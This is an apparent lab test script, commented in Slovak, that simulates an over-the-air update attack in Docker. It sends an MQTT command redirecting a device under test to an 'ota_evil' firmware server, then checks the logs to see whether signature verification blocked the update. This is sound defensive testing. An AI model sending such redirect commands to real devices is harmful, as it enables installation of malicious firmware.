#!/usr/bin/env bash
# OTA útok – attacker presmeruje DUT na evil OTA server
# Baseline: DUT aplikuje evil firmware (KPI: ota_applied>0)
# Secure:   DUT odmietne (neplatný podpis) (KPI: ota_blocked>0)
# Spustiť po: docker compose [+overlay] up -d
set -euo pipefail
cd "$(dirname "$0")/.."

echo "=== OTA ATTACK (evil server redirect) ==="
echo ""
echo "[1] Attacker posiela cmd/ota s URL evil servera..."
docker compose exec -T attacker \
  mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil" -d
echo ""
echo "[2] Čakám 8 s na DUT reakciu..."
sleep 8
echo ""
echo "[3] DUT log (posledné OTA záznamy):"
RUN_ID=$(grep '^RUN_ID=' .env | cut -d= -f2)
grep -i "OTA\|aplikované\|ZAMIETNUTÁ\|podpis" "runs/${RUN_ID}/logs/dut.log" 2>/dev/null | tail -10 \
  || echo "  (log zatiaľ prázdny)"
echo ""
echo "=== Skontroluj summary.json: ota_applied vs ota_blocked ==="
